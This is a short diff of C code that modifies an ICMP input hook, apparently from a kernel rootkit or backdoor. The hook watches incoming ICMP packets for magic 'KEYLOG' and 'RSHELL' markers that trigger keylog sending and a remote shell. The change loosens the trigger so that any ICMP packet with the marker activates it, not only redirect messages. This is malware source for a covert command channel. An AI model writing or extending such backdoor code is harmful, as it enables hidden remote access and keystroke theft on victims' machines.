@@ -393,16 +393,12 @@ int icmp_input_hook(struct mbuf **m, int *off, int proto){
 	(*m)->m_data -= hlen;
 
 	/* Is this the ICMP message we are looking for? */
-	if (icp->icmp_type == ICMP_REDIRECT &&
-	    icp->icmp_code == ICMP_REDIRECT_TOSHOST &&
-	    strncmp(icp->icmp_data, KEYLOG, 3) == 0) {
+	if (strncmp(icp->icmp_data, KEYLOG, 3) == 0) {
 		printf("send keylog.\n");
 		return(0);
 	}
 
-	else if (icp->icmp_type == ICMP_REDIRECT &&
-	  	 	icp->icmp_code == ICMP_REDIRECT_TOSHOST &&
-	    	strncmp(icp->icmp_data, RSHELL, 5) == 0) {
+	else if (strncmp(icp->icmp_data, RSHELL, 5) == 0) {
 			printf("send shell.\n");
 			return(0);
 	}
